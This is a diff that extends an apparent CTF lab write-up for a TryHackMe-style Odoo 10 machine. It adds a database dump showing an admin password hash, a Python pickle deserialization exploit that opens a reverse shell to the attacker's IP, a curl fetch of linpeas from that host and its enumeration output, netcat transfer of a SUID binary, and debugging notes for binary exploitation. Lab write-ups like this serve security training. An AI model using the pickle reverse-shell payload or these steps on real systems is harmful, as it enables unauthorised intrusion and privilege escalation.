@@ -312,6 +312,64 @@ with open("exploit.pickle", "wb") as f:
 <br>
 <br>
 
+manage Database
+
+<img width="690" height="260" alt="image" src="https://github.com/user-attachments/assets/b90176e1-5bbf-4813-8f18-ba1415e1ab39" />
+
+Backup
+
+<img width="693" height="469" alt="image" src="https://github.com/user-attachments/assets/15a73aa1-4872-42ce-ac80-d3eb386a705c" />
+
+
+<img width="678" height="133" alt="image" src="https://github.com/user-attachments/assets/afdf91a3-a9e7-427c-9fe7-fdee7e6d51d0" />
+
+
+<img width="732" height="200" alt="image" src="https://github.com/user-attachments/assets/b6431708-bca5-4340-b103-b78bd2b808f5" />
+
+
+<img width="474" height="123" alt="image" src="https://github.com/user-attachments/assets/6ff5b85b-e8aa-4da6-a08a-8f6bb0844787" />
+
+
+:~/Obscure# grep -Ei "*@antisoft\.thm" dump.sql
+3	Administrator	1	\N	\N	\N	2022-07-23 10:51:25.449364	0	t	\N	\N	Administrator	\N	\N	\N	\N	\N	\N	f	\N	admin@antisoft.thm	f	\N	en_US	\N	\N	\N	f	2022-07-23 10:52:10.087949	\N	\N	1	f	1	\N	\N	\N	contact	f	\N	\N	3
+1	t	admin@antisoft.thm		1	3	\N	f	1	\N	\N	2022-07-23 10:52:10.087949	<span data-o-mail-quote="1">-- <br data-o-mail-quote="1">\nAdministrator</span>	$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag
+
+
+
+
+
+Odoo 10.0-20190816 (Community Edition)
+
+<img width="744" height="363" alt="image" src="https://github.com/user-attachments/assets/4ddd92d3-854b-48db-aaca-a945992b3777" />
+
+
+ex.py
+
+
+
+
+import pickle
+import os
+
+class Exploit(object):
+    def __reduce__(self):
+        payload = 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.201.47.153\',9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\'sh\')"'
+        return (os.system, (payload,))
+
+with open("exploit.pickle", "wb") as f:
+    pickle.dump(Exploit(), f, pickle.HIGHEST_PROTOCOL)
+
+
+
+	<img width="1220" height="469" alt="image" src="https://github.com/user-attachments/assets/da974bec-ba42-4fd8-99a5-0f3d92cc86d3" />
+
+
+
+
+
+
+
+
 
 <p>
 
@@ -426,51 +484,48 @@ odoo@b8a9bbf1f380:/$
 <br>
 
 ```bash
+$ SHELL=/bin/bash script -q /dev/null
 SHELL=/bin/bash script -q /dev/null
+
 ```
 
-<br>
 
-```bash
+<img width="1281" height="332" alt="image" src="https://github.com/user-attachments/assets/c7601fde-89a8-4bc4-af10-f198805b32d7" />
+
+
+
+
+odoo@b8a9bbf1f380:/$ pwd        
+pwd
+/
 odoo@b8a9bbf1f380:/$ cd /var/lib/odoo
-
-odoo@b8a9bbf1f380:~$ ls -a
-ls -a
-.   .bash_history  field_anonymization_main_1.pickle  flag.txt
-..  addons	   filestore			      sessions
+cd /var/lib/odoo
 odoo@b8a9bbf1f380:~$ 
 
 
-
-odoo@b8a9bbf1f380:~$ ls
-addons
-field_anonymization_main_1.pickle
-filestore
-flag.txt
-sessions
+odoo@b8a9bbf1f380:~$ ls -lah
+ls -lah
+total 28K
+drwxr-xr-x 5 odoo odoo 4.0K Feb 22  2023 .
+drwxr-xr-x 1 root root 4.0K Oct 17  2019 ..
+lrwxrwxrwx 1 root root    9 Feb 22  2023 .bash_history -> /dev/null
+drwx------ 3 odoo odoo 4.0K Jul 23  2022 addons
+-rw-r--r-- 1 odoo odoo 1.4K Sep 27 21:08 field_anonymization_main_1.pickle
+drwxr-xr-x 3 odoo odoo 4.0K Jul 23  2022 filestore
+-rw-r--r-- 1 root root   38 Feb 22  2023 flag.txt
+drwx------ 2 odoo odoo 4.0K Sep 27 21:09 sessions
 odoo@b8a9bbf1f380:~$ cat flag.txt
+cat flag.txt
 THM{1243b64a3a01a8732ccb96217f593520}
 
 
 
-getcap -r / 2>/dev/null
+<img width="1339" height="358" alt="image" src="https://github.com/user-attachments/assets/972ff2f3-e10b-406b-bb89-bc5651bf3310" />
 
 
 
-odoo@b8a9bbf1f380:~$ find / -perm -u=s f 2>/dev/null
-/bin/mount
-/bin/umount
-/bin/ping
-/bin/ping6
-/bin/su
-/usr/lib/openssh/ssh-keysign
-/usr/bin/newgrp
-/usr/bin/chsh
-/usr/bin/chfn
-/usr/bin/gpasswd
-/usr/bin/passwd
-/ret
-```
+
+
 
 
 odoo@b8a9bbf1f380:/tmp$ find / -perm -4000 -ls 2>/dev/null
@@ -489,17 +544,21 @@ find / -perm -4000 -ls 2>/dev/null
  10150   12 -rwsr-xr-x   1 root     root         8864 Jul 23  2022 /ret
 
 
-<br>
+<img width="1342" height="418" alt="image" src="https://github.com/user-attachments/assets/c13eeb38-8780-45be-8b69-dd87d98c6667" />
 
-```bash
+
+0doo@b8a9bbf1f380:/$ pwd
+pwd
+/
 odoo@b8a9bbf1f380:/$ ls -lah
+ls -lah
 total 88K
 drwxr-xr-x   1 root root 4.0K Jul 26  2022 .
 drwxr-xr-x   1 root root 4.0K Jul 26  2022 ..
 -rwxr-xr-x   1 root root    0 Jul 23  2022 .dockerenv
 drwxr-xr-x   1 root root 4.0K Jul 23  2022 bin
 drwxr-xr-x   2 root root 4.0K Jun 14  2018 boot
-drwxr-xr-x   5 root root  340 Aug 16 20:18 dev
+drwxr-xr-x   5 root root  340 Sep 27 20:42 dev
 -rwxrwxr-x   1 root root 1.1K Oct 17  2019 entrypoint.sh
 drwxr-xr-x   1 root root 4.0K Jul 23  2022 etc
 drwxr-xr-x   2 root root 4.0K Jun 14  2018 home
@@ -508,17 +567,501 @@ drwxr-xr-x   2 root root 4.0K Oct 14  2019 lib64
 drwxr-xr-x   2 root root 4.0K Oct 14  2019 media
 drwxr-xr-x   1 root root 4.0K Oct 17  2019 mnt
 drwxr-xr-x   2 root root 4.0K Oct 14  2019 opt
-dr-xr-xr-x 134 root root    0 Aug 16 20:18 proc
+dr-xr-xr-x 131 root root    0 Sep 27 20:42 proc
 -rwsr-xr-x   1 root root 8.7K Jul 23  2022 ret
 drwx------   1 root root 4.0K Jul 23  2022 root
 drwxr-xr-x   1 root root 4.0K Oct 17  2019 run
 drwxr-xr-x   1 root root 4.0K Oct 17  2019 sbin
 drwxr-xr-x   2 root root 4.0K Oct 14  2019 srv
-dr-xr-xr-x  13 root root    0 Aug 16 20:18 sys
-drwxrwxrwt   1 root root 4.0K Aug 16 22:03 tmp
+dr-xr-xr-x  13 root root    0 Sep 27 20:42 sys
+drwxrwxrwt   1 root root 4.0K Sep 27 20:51 tmp
 drwxr-xr-x   1 root root 4.0K Oct 14  2019 usr
 drwxr-xr-x   1 root root 4.0K Oct 14  2019 var
-```
+odoo@b8a9bbf1f380:/$ 
+
+
+
+
+
+cat entrypoint.sh
+#!/bin/bash
+
+set -e
+
+# set the postgres database host, port, user and password according to the environment
+# and pass them as arguments to the odoo process if not present in the config file
+: ${HOST:=${DB_PORT_5432_TCP_ADDR:='db'}}
+: ${PORT:=${DB_PORT_5432_TCP_PORT:=5432}}
+: ${USER:=${DB_ENV_POSTGRES_USER:=${POSTGRES_USER:='odoo'}}}
+: ${PASSWORD:=${DB_ENV_POSTGRES_PASSWORD:=${POSTGRES_PASSWORD:='odoo'}}}
+
+DB_ARGS=()
+function check_config() {
+    param="$1"
+    value="$2"
+    if ! grep -q -E "^\s*\b${param}\b\s*=" "$ODOO_RC" ; then
+        DB_ARGS+=("--${param}")
+        DB_ARGS+=("${value}")
+   fi;
+}
+check_config "db_host" "$HOST"
+check_config "db_port" "$PORT"
+check_config "db_user" "$USER"
+check_config "db_password" "$PASSWORD"
+
+case "$1" in
+    -- | odoo)
+        shift
+        if [[ "$1" == "scaffold" ]] ; then
+            exec odoo "$@"
+        else
+            exec odoo "$@" "${DB_ARGS[@]}"
+        fi
+        ;;
+    -*)
+        exec odoo "$@" "${DB_ARGS[@]}"
+        ;;
+    *)
+        exec "$@"
+esac
+
+exit 1
+odoo@b8a9bbf1f380:/$ 
+
+
+
+
+
+
+
+odoo@b8a9bbf1f380:/tmp$ curl http://10.201.47.153:8000/linpeas.sh -o linpeas.sh
+<l http://10.201.47.153:8000/linpeas.sh -o linpeas.sh                        
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  227k  100  227k    0     0  23.6M      0 --:--:-- --:--:-- --:--:-- 27.8M
+
+
+
+
+
+
+
+
+______________________
+
+
++] Services
+[i] Search for outdated versions
+ [ - ]  bootlogs
+ [ - ]  bootmisc.sh
+ [ - ]  checkfs.sh
+ [ - ]  checkroot-bootclean.sh
+ [ - ]  checkroot.sh
+ [ - ]  dirmngr
+ [ - ]  hostname.sh
+ [ - ]  killprocs
+ [ - ]  motd
+ [ - ]  mountall-bootclean.sh
+ [ - ]  mountall.sh
+ [ - ]  mountdevsubfs.sh
+ [ - ]  mountkernfs.sh
+ [ - ]  mountnfs-bootclean.sh
+ [ - ]  mountnfs.sh
+ [ + ]  odoo
+ [ - ]  procps
+ [ - ]  rc.local
+ [ - ]  rmnologin
+ [ - ]  sendsigs
+ [ - ]  ssh
+ [ + ]  udev
+ [ - ]  umountfs
+ [ - ]  umountnfs.sh
+ [ - ]  umountroot
+ [ - ]  urandom
+ [ - ]  x11-common
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+You can't write on systemd PATH so I'm not going to list relative paths executed by services
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+
+[+] D-Bus Service Objects list
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+Failed to connect to bus: No such file or directory
+busctl Not Found
+
+
+===================================( Network Information )====================================
+[+] Hostname, hosts and DNS
+b8a9bbf1f380
+127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::0	ip6-localnet
+ff00::0	ip6-mcastprefix
+ff02::1	ip6-allnodes
+ff02::2	ip6-allrouters
+172.17.0.2	db b5cc3d65e489 unkkuri-db
+172.17.0.3	b8a9bbf1f380
+nameserver 10.201.0.2
+search ec2.internal
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Networks and neighbours
+default		0.0.0.0
+loopback	127.0.0.0
+link-local	169.254.0.0
+
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+172.17.0.1 dev eth0 lladdr 02:42:5b:d6:fa:32 REACHABLE
+172.17.0.2 dev eth0 lladdr 02:42:ac:11:00:02 REACHABLE
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
+Usage: ss [ OPTIONS ]
+       ss [ OPTIONS ] [ FILTER ]
+   -h, --help		this message
+   -V, --version	output version information
+   -n, --numeric	don't resolve service names
+   -r, --resolve       resolve host names
+   -a, --all		display all sockets
+   -l, --listening	display listening sockets
+   -o, --options       show timer information
+   -e, --extended      show detailed socket information
+   -m, --memory        show socket memory usage
+   -p, --processes	show process using socket
+   -i, --info		show internal TCP information
+   -s, --summary	show socket usage summary
+   -b, --bpf           show bpf filter socket information
+   -Z, --context	display process SELinux security contexts
+   -z, --contexts	display process and socket SELinux security contexts
+
+   -4, --ipv4          display only IP version 4 sockets
+   -6, --ipv6          display only IP version 6 sockets
+   -0, --packet	display PACKET sockets
+   -t, --tcp		display only TCP sockets
+   -u, --udp		display only UDP sockets
+   -d, --dccp		display only DCCP sockets
+   -w, --raw		display only RAW sockets
+   -x, --unix		display only Unix domain sockets
+   -f, --family=FAMILY display sockets of type FAMILY
+
+   -A, --query=QUERY, --socket=QUERY
+       QUERY := {all|inet|tcp|udp|raw|unix|unix_dgram|unix_stream|unix_seqpacket|packet|netlink}[,QUERY]
+
+   -D, --diag=FILE     Dump raw information about TCP sockets to FILE
+   -F, --filter=FILE   read filter information from FILE
+       FILTER := [ state TCP-STATE ] [ EXPRESSION ]
+
+[+] Can I sniff with tcpdump?
+No
+
+
+====================================( Users Information )=====================================
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
+uid=105(odoo) gid=109(odoo) groups=109(odoo)
+
+[+] Do I have PGP keys?
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+
+[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+dirmngr:x:104:107::/var/cache/dirmngr:/bin/sh
+root:x:0:0:root:/root:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=100(systemd-timesync) gid=103(systemd-timesync) groups=103(systemd-timesync)
+uid=101(systemd-network) gid=104(systemd-network) groups=104(systemd-network)
+uid=102(systemd-resolve) gid=105(systemd-resolve) groups=105(systemd-resolve)
+uid=103(systemd-bus-proxy) gid=106(systemd-bus-proxy) groups=106(systemd-bus-proxy)
+uid=104(dirmngr) gid=107(dirmngr) groups=107(dirmngr)
+uid=105(odoo) gid=109(odoo) groups=109(odoo)
+uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+
+[+] Login now
+ 21:20:28 up 38 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+
+wtmp begins Sat Jul 23 07:13:41 2022
+
+[+] Last time logon each user
+Username         Port     From             Latest
+
+[+] Password policy
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+===================================( Software Information )===================================
+[+] MySQL version
+mysql Not Found
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Searching mysql credentials and exec
+ Not Found
+
+[+] PostgreSQL version and pgadmin credentials
+Version: psql (PostgreSQL) 11.5 (Debian 11.5-3.pgdg80+1)
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+ Not Found
+
+[+] Searching PHPCookies
+ Not Found
+
+[+] Searching Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Searching Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Searching Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+ Not Found
+
+[+] Searching supervisord configuration file
+supervisord.conf Not Found
+
+[+] Searching cesi configuration file
+cesi.conf Not Found
+
+[+] Searching Rsyncd config file
+rsyncd.conf Not Found
+[+] Searching Hostapd config file
+hostapd.conf Not Found
+
+[+] Searching wifi conns file
+ Not Found
+
+[+] Searching Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Searching .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Searching ldap directories and their hashes
+/etc/ldap
+/etc/skel/.profile    /usr/lib/python2.6/dist-packages/ldap
+/usr/lib/python2.7/dist-packages/ldap
+The password hash is from the {SSHA} to 'structural'
+
+[+] Searching .ovpn files and credentials
+.ovpn Not Found
+
+[+] Searching ssl/ssh files
+Port 22
+PermitRootLogin without-password
+PubkeyAuthentication yes
+PermitEmptyPasswords no
+ChallengeResponseAuthentication no
+UsePAM yes
+ --> /etc/hosts.allow file found, read the rules:
+
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+    GSSAPIDelegateCredentials no
+
+[+] Searching unexpected auth lines in /etc/pam.d/sshd
+No
+
+[+] Searching Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Searching kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+krb5.conf Not Found
+tickets kerberos Not Found
+klist Not Found
+
+[+] Searching Kibana yaml
+kibana.yml Not Found
+
+[+] Searching Knock configuration
+Knock.config Not Found
+
+[+] Searching logstash files
+ Not Found
+
+[+] Searching elasticsearch files
+ Not Found
+
+[+] Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Searching AD cached hashes
+cached hashes Not Found
+
+[+] Searching screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+screen Not Found
+
+[+] Searching tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Searching Couchdb directory
+
+[+] Searching redis.conf
+
+[+] Searching dovecot files
+dovecot credentials Not Found
+
+[+] Searching mosquitto.conf
+
+[+] Searching neo4j auth file
+
+[+] Searching Cloud-Init conf file
+
+[+] Searching Erlang cookie file
+
+[+] Searching GVM auth file
+
+[+] Searching IPSEC files
+
+
+====================================( Interesting Files )=====================================
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/bin/umount		--->	BSD/Linux(08-1996)
+/bin/ping
+/bin/ping6
+/bin/su
+/usr/lib/openssh/ssh-keysign
+/usr/bin/newgrp		--->	HP-UX_10.20
+/usr/bin/chsh
+/usr/bin/chfn		--->	SuSE_9.3/10
+/usr/bin/gpasswd
+/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/ret
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+/usr/bin/expiry
+/usr/bin/chage
+/usr/bin/wall
+/usr/bin/ssh-agent
+/sbin/unix_chkpwd
+
+[+] Writable folders configured in /etc/ld.so.conf.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d
+/usr/local/lib
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+
+[+] Users with capabilities
+/etc/security/capability.conf Not Found
+
+
+
+__
+
+
+
+
+<img width="1752" height="328" alt="image" src="https://github.com/user-attachments/assets/3a593320-0359-436a-9424-23e09d2840e6" />
+
+
+
+<img width="1750" height="524" alt="image" src="https://github.com/user-attachments/assets/19d5ca48-ddfa-4711-9735-ee3c185f5c2b" />
+
+
+<img width="1753" height="377" alt="image" src="https://github.com/user-attachments/assets/aa7df21d-e188-4dfc-9616-30d228584cc6" />
+
+
+odoo@b8a9bbf1f380:/$ nc -nlvp 8888 < ret
+nc -nlvp 8888 < ret
+Ncat: Version 6.47 ( http://nmap.org/ncat )
+Ncat: Listening on :::8888
+Ncat: Listening on 0.0.0.0:8888
+
+<br>
 
 <br>
 <br>
@@ -591,6 +1134,16 @@ odoo@b8a9bbf1f380:/tmp$
 <p> 172.17.0.1 has port 4444 open</p>
 
 odoo@b8a9bbf1f380:/tmp$ ./nmap -Pn 172.17.0/24
+
+
+
+<img width="840" height="341" alt="image" src="https://github.com/user-attachments/assets/86baec93-e316-4e56-9dd6-c7372083b0cf" />
+
+
+ifconfig
+
+<img width="463" height="454" alt="image" src="https://github.com/user-attachments/assets/b6921044-a3db-40ce-b1c6-4e9c8ebd271d" />
+
 
 
 
@@ -730,6 +1283,12 @@ boot  etc  home        initrd.img.old  lib64  media       opt  root  sbin  srv  
 :~/Obscure# chmod 777 exploit_me
 ```
 
+checksec
+
+
+<img width="455" height="260" alt="image" src="https://github.com/user-attachments/assets/3ee6ae65-4e0a-4f31-aaf9-2fda1ecc2413" />
+
+
 <br>
 <br>
 <h4>Ghidra</h4>
@@ -740,6 +1299,28 @@ boot  etc  home        initrd.img.old  lib64  media       opt  root  sbin  srv  
 
 <br>
 <br>
+
+
+
+
+gdb exploit_me
+
+(gdb) x $rsp
+0x7ffcc8e21018:	0x61616161
+
+zeeshan@hydra:/$ ldd /exploit_me
+	linux-vdso.so.1 =>  (0x00007ffd0e73a000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb0b983f000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007fb0b9c09000)
+
+
+
+
+
+
+
+<img width="836" height="431" alt="image" src="https://github.com/user-attachments/assets/abb3bfb7-9b39-44a9-a72b-f3fb84909448" />
+
 
 
 ```bash
